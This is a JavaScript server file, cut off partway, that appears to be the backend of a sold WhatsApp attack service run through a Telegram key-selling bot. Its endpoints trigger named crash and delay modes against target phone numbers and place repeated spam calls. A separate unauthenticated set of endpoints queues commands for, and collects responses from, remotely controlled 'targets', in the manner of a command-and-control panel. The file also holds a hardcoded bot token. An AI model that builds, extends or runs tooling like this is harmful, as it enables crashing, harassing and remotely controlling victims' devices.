// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const cors = require('cors');
const http = require("http");
const { Server } = require("socket.io");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = process.env.BOT_TOKEN || "8665749726:AAGI7SshwzgqkvyBe_1jzh-DHiP14zFvFxs";
const OWNER_ID = process.env.OWNER_ID || "8172523898";
const PORT = process.env.PORT || config.port || 3000;

// Origin frontend yang diizinkan (Netlify + localhost)
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || "")
  .split(",")
  .map(s => s.trim())
  .filter(Boolean);

// default origin kalau env kosong (dev)
if (ALLOWED_ORIGINS.length === 0) {
  ALLOWED_ORIGINS.push("http://localhost:3000", "http://localhost:8888");
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: ALLOWED_ORIGINS,
    credentials: true
  }
});

// ==================== GLOBAL VARIABLES ==================== //
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {};
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000;
let userApiBug = null;

// ==================== SENDER SESSION MANAGEMENT ==================== //
const activeConnections = {};
const senderSessionsDir = process.env.SENDER_DIR || './permenmd';

function ensureSenderDir(username, number) {
  const userDir = path.join(senderSessionsDir, username);
  const sessionDir = path.join(userDir, number);
  if (!fs.existsSync(senderSessionsDir)) fs.mkdirSync(senderSessionsDir, { recursive: true });
  if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
  return sessionDir;
}

function deleteSenderSession(username, senderId) {
  const sessionDir = path.join(senderSessionsDir, username, senderId);
  const credsCopy = path.join(senderSessionsDir, username, senderId + '.json');
  try {
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
    if (fs.existsSync(credsCopy)) fs.unlinkSync(credsCopy);
    delete activeConnections[senderId];
    console.log(`[SENDER] Session ${senderId} untuk ${username} berhasil dihapus.`);
    return true;
  } catch (err) {
    console.error(`[SENDER] Gagal hapus session ${senderId}:`, err.message);
    return false;
  }
}

function getActiveSenders(username) {
  const userDir = path.join(senderSessionsDir, username);
  if (!fs.existsSync(userDir)) return [];
  const items = fs.readdirSync(userDir);
  const senders = [];
  for (const item of items) {
    const itemPath = path.join(userDir, item);
    if (fs.existsSync(path.join(itemPath, 'creds.json'))) {
      const isActive = !!activeConnections[item];
      senders.push({
        id: item,
        sessionName: item,
        number: item,
        connected: isActive
      });
    }
  }
  return senders;
}

// ==================== SENDER WHATSAPP CONNECTION LOGIC ==================== //
async function pairingWa(number, username, attempt = 1) {
  if (attempt >= 5) {
    console.log(`[SENDER] Max retry pairing untuk ${number}, berhenti.`);
    return false;
  }

  const sessionDir = ensureSenderDir(username, number);

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
        if (!isLoggedOut) {
          console.log(`[SENDER] Reconnect ${number} (attempt ${attempt + 1}/5)`);
          await sleep(3000);
          await pairingWa(number, username, attempt + 1);
        } else {
          delete activeConnections[number];
          console.log(`[SENDER] ${number} logged out.`);
        }
      } else if (connection === "open") {
        activeConnections[number] = sock;
        console.log(`[SENDER] ${number} terhubung untuk ${username}!`);
        const sourceCreds = path.join(sessionDir, 'creds.json');
        const destCreds = path.join(senderSessionsDir, username, number + '.json');
        try {
          await sleep(3000);
          if (fs.existsSync(sourceCreds)) {
            fs.copyFileSync(sourceCreds, destCreds);
          }
        } catch (e) {}
      }
    });

    if (!sock.authState.creds.registered) {
      await sleep(1000);
      const code = await sock.requestPairingCode(number);
      console.log(`[SENDER] Pairing code ${number}: ${code}`);
      return code;
    }
    return null;
  } catch (err) {
    console.error(`[SENDER] Error pairingWa ${number}:`, err.message);
    return false;
  }
}

async function startSenderSessions() {
  if (!fs.existsSync(senderSessionsDir)) {
    console.log('[SENDER] Folder permenmd tidak ada, skip auto-connect.');
    return;
  }
  const userDirs = fs.readdirSync(senderSessionsDir).filter(name =>
    fs.lstatSync(path.join(senderSessionsDir, name)).isDirectory()
  );
  if (userDirs.length === 0) return;
  console.log(`[SENDER] Auto-connect ${userDirs.length} user...`);

  for (const username of userDirs) {
    const userDir = path.join(senderSessionsDir, username);
    const items = fs.readdirSync(userDir);
    for (const item of items) {
      const itemPath = path.join(userDir, item);
      if (fs.existsSync(path.join(itemPath, 'creds.json'))) {
        if (activeConnections[item]) continue;
        try {
          await connectSenderSession(itemPath, item, username);
        } catch (err) {
          console.error(`[SENDER] Gagal hubungkan ${item}:`, err.message);
        }
      }
    }
  }
}

async function connectSenderSession(folderPath, sessionName, username, retries = 5) {
  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(folderPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          console.log(`[SENDER] ${sessionName} terhubung.`);
          resolve(true);
        } else if (connection === "close") {
          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
            resolve(false);
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSenderSession(folderPath, sessionName, username, retries - 1));
          } else {
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve(false);
          }
        }
      });
    } catch (err) {
      console.log(`[SENDER] ${sessionName} SKIP:`, err.message);
      resolve(false);
    }
  });
}

// ==================== AUTH MIDDLEWARES ==================== //
// Support cookie ATAU header Authorization: Bearer <username>
function getSessionUsername(req) {
  if (req.cookies && req.cookies.sessionUser) return req.cookies.sessionUser;
  const auth = req.headers.authorization;
  if (auth && /^Bearer\s+/i.test(auth)) {
    return auth.replace(/^Bearer\s+/i, '').trim();
  }
  return null;
}

function requireSenderAuth(req, res, next) {
  const username = getSessionUsername(req);
  if (!username) return res.status(401).json({ valid: false, message: "Belum login." });
  const users = getUsers();
  const u = users.find(x => x.username === username);
  if (!u) return res.status(401).json({ valid: false, message: "User tidak ditemukan." });
  if (!u.expired || Date.now() > u.expired)
    return res.status(401).json({ valid: false, message: "Sesi kedaluwarsa." });
  req.currentUser = u;
  next();
}

// ==================== TARGET DATA FILES ==================== //
const TARGETS_FILE = './targets.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const readData = (file) => {
  if (!fs.existsSync(file)) return [];
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8') || '[]');
  } catch { return []; }
};

const saveData = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) { console.log(`[!] Gagal simpan: ${file}`, e); }
};

// ==================== UTILITY ==================== //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== ACCESS CONTROL ==================== //
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return Array.isArray(data.owners) && data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || (Array.isArray(data.akses) && data.akses.includes(id));
}

// ==================== USER ROLE ==================== //
const VALID_USER_ROLES = ["OWNER", "VIP", "USER"];
const ROLE_LABEL = { OWNER: "👑 OWNER", VIP: "💎 VIP", USER: "🧑 USER" };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
  } catch (err) {
    console.error("❌ Gagal simpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch { return []; }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  switch (unit) {
    case "s": return value * 1000;
    case "m": return value * 60 * 1000;
    case "h": return value * 60 * 60 * 1000;
    case "d": return value * 24 * 60 * 60 * 1000;
    default: return null;
  }
}

// ==================== BOT COMMANDS ==================== //
bot.command('start', async (ctx) => {
  try {
    await ctx.replyWithPhoto("https://files.catbox.moe/u040ae.jpg", {
      caption: `<blockquote>Creator : @AiiSigma
Version : 5.01
League : Asia⧸Bandung

🔑 KEY MANAGER
/addkey User,Day[,Role]
/listkey
/delkey

🎗️ OWNER MANAGEMENT
/addacces
/delacces
/addowner
/delowner
/setjeda

<a href="https://t.me/AiiSigma">© 𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a></blockquote>`,
      parse_mode: 'HTML',
    });
  } catch (e) {
    await ctx.reply('❌ Gagal kirim gambar.');
  }
});

function generateAndSendKey(ctx, userId, username, durationMs, role) {
  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();
  const idx = users.findIndex(u => u.username === username);
  if (idx !== -1) users[idx] = { ...users[idx], key, expired, role };
  else users.push({ username, key, expired, role });
  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta"
  });

  const text = [
    `✅ <b>Key berhasil dibuat:</b>\n`,
    `🆔 <b>Username:</b> <code>${username}</code>`,
    `🔑 <b>Key:</b> <code>${key}</code>`,
    `🎖️ <b>Role:</b> <code>${role}</code>`,
    `⏳ <b>Expired:</b> ${expiredStr} WIB\n`,
    "<b>Note:</b> Jangan disebar / difreekan / dijual."
  ].join("\n");

  return ctx.telegram.sendMessage(userId, text, { parse_mode: "HTML" });
}

bot.command("addkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(userId, "[ ! ] - ONLY ACCESS USER");
  }
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(userId, 'Format: /addkey user,30d,VIP', { parse_mode: 'HTML' });
  }
  const parts = args.split(",").map(s => s.trim());
  const username = parts[0];
  const durasiStr = parts[1];
  const directRole = (parts[2] || "").toUpperCase();
  if (!username) return ctx.telegram.sendMessage(userId, "Username kosong.");
  const durationMs = parseDuration(durasiStr || "");
  if (!durationMs) return ctx.telegram.sendMessage(userId, "Durasi salah. Contoh: 7d");

  if (directRole) {
    if (!VALID_USER_ROLES.includes(directRole))
      return ctx.telegram.sendMessage(userId, "Role tidak valid.");
    return generateAndSendKey(ctx, userId, username, durationMs, directRole)
      .then(() => ctx.reply(`✅ Key untuk *${username}* (${directRole}) dibuat.`, { parse_mode: "Markdown" }))
      .catch(() => ctx.reply("❌ Gagal kirim key."));
  }

  return ctx.reply(
    `🔑 *Buat Key*\n\n👤 ${username}\n⏳ ${durasiStr}\n\nPilih role:`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: ROLE_LABEL.OWNER, callback_data: `genkey|${username}|${durasiStr}|OWNER` },
            { text: ROLE_LABEL.VIP, callback_data: `genkey|${username}|${durasiStr}|VIP` },
            { text: ROLE_LABEL.USER, callback_data: `genkey|${username}|${durasiStr}|USER` }
          ],
          [{ text: "❌ Batal", callback_data: `genkey|${username}|${durasiStr}|CANCEL` }]
        ]
      }
    }
  );
});

bot.action(/^genkey\|([^|]+)\|([^|]+)\|(OWNER|VIP|USER|CANCEL)$/, async (ctx) => {
  const clickerId = ctx.from.id.toString();
  if (!isOwner(clickerId) && !isAuthorized(clickerId)) {
    try { await ctx.answerCbQuery("Tidak ada akses.", { show_alert: true }); } catch {}
    return;
  }
  const [, username, durasiStr, role] = ctx.match;
  if (role === "CANCEL") {
    try { await ctx.answerCbQuery("Dibatalkan."); } catch {}
    try { await ctx.editMessageText(`⚪ Dibatalkan.`); } catch {}
    return;
  }
  const durationMs = parseDuration(durasiStr);
  if (!durationMs) {
    try { await ctx.answerCbQuery("Durasi rusak.", { show_alert: true }); } catch {}
    return;
  }
  try {
    await generateAndSendKey(ctx, clickerId, username, durationMs, role);
    try { await ctx.answerCbQuery(`Key dibuat (${role})`); } catch {}
    try { await ctx.editMessageText(`✅ Key *${username}* dibuat. Role: *${role}*`, { parse_mode: "Markdown" }); } catch {}
  } catch (err) {
    try { await ctx.answerCbQuery("Gagal: " + err.message, { show_alert: true }); } catch {}
  }
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[ ! ] - ONLY OWNER");
  const users = getUsers();
  if (users.length === 0) return ctx.reply("💢 Belum ada key.");
  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nRole: \`${u.role || "USER"}\`\nExpired: _${exp}_ WIB\n\n`;
  });
  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId) && !isAuthorized(userId)) return ctx.reply("[ ! ] - ONLY ACCES USER");
  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("Contoh: /delkey rann");
  const users = getUsers();
  const idx = users.findIndex(u => u.username === username);
  if (idx === -1) return ctx.reply(`❌ User \`${username}\` tidak ada.`, { parse_mode: "Markdown" });
  users.splice(idx, 1);
  saveUsers(users);
  ctx.reply(`✅ Key *${username}* dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[ ! ] - ONLY OWNER");
  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("Contoh: /addacces 7066156416");
  const data = loadAkses();
  if (!Array.isArray(data.akses)) data.akses = [];
  if (data.akses.includes(id)) return ctx.reply("✅ Sudah ada akses.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Akses diberikan ke ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[ ! ] - ONLY OWNER");
  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("Contoh: /delacces 7066156416");
  const data = loadAkses();
  if (!Array.isArray(data.akses) || !data.akses.includes(id)) return ctx.reply("❌ Tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Akses ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[ ! ] - ONLY OWNER");
  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("Contoh: /addowner 7066156416");
  const data = loadAkses();
  if (!Array.isArray(data.owners)) data.owners = [];
  if (data.owners.includes(id)) return ctx.reply("❌ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ Owner baru: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("[ ! ] - ONLY OWNER");
  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("Contoh: /delowner 7066156416");
  const data = loadAkses();
  if (!Array.isArray(data.owners) || !data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Owner ${id} dihapus.`);
});

bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  const ms = parseDuration(input);
  if (!ms) return ctx.reply("Format salah. Contoh: 30s / 5m / 1h / 1d");
  DEFAULT_COOLDOWN_MS = ms;
  ctx.reply(`✅ Jeda diubah jadi *${input}*.`, { parse_mode: "Markdown" });
});

// ==================== BOT INIT ==================== //
console.clear();
console.log(chalk.cyanBright(`\nIndictiveCore - Hutao Edition\n`));
bot.launch();
startSenderSessions();

// ==================== WEB SERVER ==================== //
app.use(cors({
  origin: function (origin, cb) {
    // izinkan tanpa origin (curl/postman), atau origin yang masuk daftar
    if (!origin) return cb(null, true);
    if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
    // izinkan semua *.netlify.app supaya gampang
    if (/^https:\/\/[a-z0-9-]+\.netlify\.app$/.test(origin)) return cb(null, true);
    return cb(new Error("Not allowed by CORS: " + origin));
  },
  credentials: true
}));

app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));
app.use(cookieParser());
app.use(bodyParser.json({ limit: '500mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '500mb' }));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = getSessionUsername(req);
  if (!username) return res.redirect("/login?msg=Silakan login");
  const users = getUsers();
  const u = users.find(x => x.username === username);
  if (!u) return res.redirect("/login?msg=User tidak ditemukan");
  if (Date.now() > u.expired) return res.redirect("/login?msg=Session expired");
  req.currentUser = u;
  next();
}

// ==================== AUTH ROUTES ==================== //
app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.status(401).json({ success: false, message: "Username atau Key salah!" });
  }
  // Set cookie (untuk dipakai kalau frontend di-serve backend juga)
  res.cookie("sessionUser", username, {
    maxAge: 60 * 60 * 1000,
    sameSite: 'none',
    secure: true,
    httpOnly: false
  });
  return res.json({ success: true, username, message: "Login berhasil" });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  return res.json({ success: true });
});

// ==================== USER DATA API ==================== //
app.get("/api/user-data", requireSenderAuth, (req, res) => {
  const u = req.currentUser;
  const now = Date.now();
  const remainingDays = Math.max(0, Math.ceil((u.expired - now) / (1000 * 60 * 60 * 24)));

  let accessLevel = "FREE USER";
  let levelColor = "#FF6B6B";
  let levelIcon = "fa-solid fa-user";
  if (remainingDays > 30) {
    accessLevel = "PREMIUM USER"; levelColor = "#4ECDC4"; levelIcon = "fa-solid fa-crown";
  } else if (remainingDays > 7) {
    accessLevel = "STANDARD USER"; levelColor = "#FFD166"; levelIcon = "fa-solid fa-star";
  }

  const formattedTime = new Date(u.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta", year: "numeric", month: "2-digit",
    day: "2-digit", hour: "2-digit", minute: "2-digit",
  });

  const role = (u.role && VALID_USER_ROLES.includes(u.role)) ? u.role : "USER";

  res.json({
    username: u.username, key: u.key, expired: u.expired, role,
    remainingDays, accessLevel, levelColor, levelIcon, formattedTime
  });
});

// ==================== SESSION STATUS ==================== //
app.get("/api/session-status", requireSenderAuth, (req, res) => {
  try {
    const senders = getActiveSenders(req.currentUser.username);
    const activeCount = senders.filter(s => s.connected).length;
    return res.json({ count: activeCount, total: senders.length, online: activeCount > 0 });
  } catch (err) {
    return res.json({ count: 0, total: 0, online: false });
  }
});

// ==================== SENDER API ==================== //
app.get("/api/mySender", requireSenderAuth, (req, res) => {
  try {
    const senders = getActiveSenders(req.currentUser.username);
    return res.json({ valid: true, connections: senders });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.get("/api/getPairing", requireSenderAuth, async (req, res) => {
  const username = req.currentUser.username;
  const number = (req.query.number || "").toString().replace(/[^\d]/g, "");
  if (number.length < 8) {
    return res.json({ valid: false, message: "Nomor tidak valid." });
  }
  if (activeConnections[number]) {
    return res.json({ valid: false, message: `Nomor ${number} sudah terhubung.` });
  }
  try {
    const code = await pairingWa(number, username);
    if (code && typeof code === 'string') {
      return res.json({ valid: true, number, pairingCode: code });
    } else if (code === null) {
      return res.json({ valid: false, message: `Nomor ${number} sudah terdaftar.` });
    }
    return res.json({ valid: false, message: "Gagal pairing." });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

app.delete("/api/deleteSender", requireSenderAuth, async (req, res) => {
  const username = req.currentUser.username;
  const senderId = req.query.id || req.body?.id || "";
  if (!senderId) return res.json({ valid: false, message: "Sender ID kosong." });
  try {
    if (activeConnections[senderId]) {
      try { activeConnections[senderId].end(undefined, {}); } catch {}
      delete activeConnections[senderId];
    }
    const deleted = deleteSenderSession(username, senderId);
    return res.json({ valid: deleted, message: deleted ? "Berhasil dihapus." : "Gagal hapus." });
  } catch (err) {
    return res.json({ valid: false, message: err.message });
  }
});

// ==================== EXECUTION API ==================== //
app.get("/api/execute", requireSenderAuth, async (req, res) => {
  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const senderNumber = req.query.sender;

  if (!/^\d+$/.test(targetNumber)) {
    return res.json({ success: false, status: "❌ Format salah", message: "Nomor harus angka." });
  }
  if (!["andros", "ios", "andros-delay", "invis-iphone"].includes(mode)) {
    return res.json({ success: false, status: "❌ Mode salah" });
  }
  const userSock = activeConnections[senderNumber];
  if (!userSock) {
    return res.json({ success: false, status: "❌ NO SESSION", message: "Sender tidak terhubung." });
  }

  const target = `${targetNumber}@s.whatsapp.net`;
  try {
    if (mode === "andros") androcrash(userSock, target);
    else if (mode === "ios") Ipongcrash(userSock, target);
    else if (mode === "andros-delay") androdelay(userSock, target);
    else if (mode === "invis-iphone") Iponginvis(userSock, target);

    return res.json({
      success: true, status: "✅ S U C C E S", target: targetNumber, mode,
      timestamp: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
      message: `Execute Mode: ${mode.toUpperCase()}`
    });
  } catch (err) {
    return res.json({ success: false, status: "❌ Gagal", message: err.message });
  }
});

// ==================== SPAM CALL ==================== //
app.get("/api/spam-call", requireSenderAuth, async (req, res) => {
  const targetNumber = (req.query.target || "").toString().replace(/[^\d]/g, "");
  const senderNumber = req.query.sender || "";
  const callType = req.query.type || "voice";
  const count = Math.min(Math.max(parseInt(req.query.count) || 1, 1), 20);

  if (!/^\d{8,15}$/.test(targetNumber)) {
    return res.json({ success: false, status: "❌ Nomor salah" });
  }
  if (!["voice", "video"].includes(callType)) {
    return res.json({ success: false, status: "❌ Tipe salah" });
  }
  const userSock = activeConnections[senderNumber];
  if (!userSock) {
    return res.json({ success: false, status: "❌ NO SESSION" });
  }
  try {
    const result = await spamCallFunction(userSock, `${targetNumber}@s.whatsapp.net`, callType === "video", count);
    return res.json({
      success: result.success > 0,
      status: result.success > 0 ? "✅ S U C C E S" : "❌ Gagal",
      target: targetNumber, callType, count, result,
      timestamp: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
    });
  } catch (err) {
    return res.json({ success: false, status: "❌ Error", message: err.message });
  }
});

// ==================== TARGET MANAGEMENT ==================== //
app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let targets = readData(TARGETS_FILE);
  const i = targets.findIndex(t => t.id === id);
  if (i !== -1) {
    targets[i].lastSeen = new Date();
    targets[i].status = "Online";
    saveData(TARGETS_FILE, targets);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const data = req.body;
  let targets = readData(TARGETS_FILE);
  const i = targets.findIndex(t => t.id === data.id);
  if (i !== -1) targets[i] = { ...targets[i], ...data, lastSeen: new Date() };
  else targets.push({ ...data, lastSeen: new Date() });
  saveData(TARGETS_FILE, targets);
  res.json({ status: 'ok' });
});

app.get('/api/list-targets', (req, res) => res.json(readData(TARGETS_FILE)));

app.post('/api/post-notification/:id', (req, res) => {
  const id = req.params.id;
  let all = readData(NOTIF_FILE);
  all.unshift({ targetId: id, ...req.body, timestamp: new Date() });
  if (all.length > 500) all = all.slice(0, 500);
  saveData(NOTIF_FILE, all);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const all = readData(NOTIF_FILE);
  res.json(all.filter(n => n.targetId === req.params.id));
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readData(COMMANDS_FILE);
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra, timestamp: new Date() });
  saveData(COMMANDS_FILE, cmds);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readData(COMMANDS_FILE);
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const c = cmds[i]; cmds.splice(i, 1);
    saveData(COMMANDS_FILE, cmds);
    return res.json(c);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  let resps = readData(RESPONSES_FILE);
  const i = resps.findIndex(r => r.targetId === id);
  const newR = { targetId: id, ...req.body, timestamp: new Date() };
  if (i !== -1) resps[i] = newR; else resps.push(newR);
  saveData(RESPONSES_FILE, resps);
  res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readData(RESPONSES_FILE);
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

app.post('/api/login', (req, res) => {
  res.json({ status: 'ok', message: 'Bypassed' });
});

// ==================== TOOLS API ==================== //
app.get('/api/capcut-search', async (req, res) => {
  const q = req.query.q || 'trending';
  try {
    const url = 'https://www.capcut.com/api/design/search/templates?keyword=' + encodeURIComponent(q) + '&offset=0&count=20';
    const r = await axios.get(url, {
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.capcut.com/'
      },
      timeout: 10000
    });
    res.json(r.data);
  } catch (err) {
    res.json({ data: [], error: 'API unavailable' });
  }
});

app.get('/api/phone-lookup', async (req, res) => {
  const raw = (req.query.number || '').replace(/[\s\-\(\)\+]/g, '');
  if (!raw || !/^\d{7,15}$/.test(raw)) {
    return res.json({ valid: false, error: 'Invalid phone number' });
  }
  try {
    const countryMap = {
      '1': { name: 'USA', code: 'US', flag: '🇺🇸', carriers: ['Verizon', 'AT&T', 'T-Mobile'] },
      '44': { name: 'UK', code: 'GB', flag: '🇬🇧', carriers: ['Vodafone', 'EE', 'Three'] },
      '91': { name: 'India', code: 'IN', flag: '🇮🇳', carriers: ['Jio', 'Airtel', 'Vi'] },
      '62': { name: 'Indonesia', code: 'ID', flag: '🇮🇩', carriers: ['Telkomsel', 'Indosat', 'XL', 'Tri'] },
      '63': { name: 'Philippines', code: 'PH', flag: '🇵🇭', carriers: ['Globe', 'Smart', 'DITO'] },
      '60': { name: 'Malaysia', code: 'MY', flag: '🇲🇾', carriers: ['Maxis', 'Celcom', 'Digi'] },
      '66': { name: 'Thailand', code: 'TH', flag: '🇹🇭', carriers: ['AIS', 'DTAC', 'TrueMove'] },
      '84': { name: 'Vietnam', code: 'VN', flag: '🇻🇳', carriers: ['Viettel', 'Vinaphone', 'Mobifone'] },
      '880': { name: 'Bangladesh', code: 'BD', flag: '🇧🇩', carriers: ['Grameenphone', 'Banglalink'] },
      '92': { name: 'Pakistan', code: 'PK', flag: '🇵🇰', carriers: ['Jazz', 'Zong', 'Telenor'] },
      '966': { name: 'Saudi', code: 'SA', flag: '🇸🇦', carriers: ['STC', 'Mobily', 'Zain'] },
      '971': { name: 'UAE', code: 'AE', flag: '🇦🇪', carriers: ['Etisalat', 'du'] },
      '20': { name: 'Egypt', code: 'EG', flag: '🇪🇬', carriers: ['Vodafone', 'Orange'] },
      '27': { name: 'South Africa', code: 'ZA', flag: '🇿🇦', carriers: ['Vodacom', 'MTN'] },
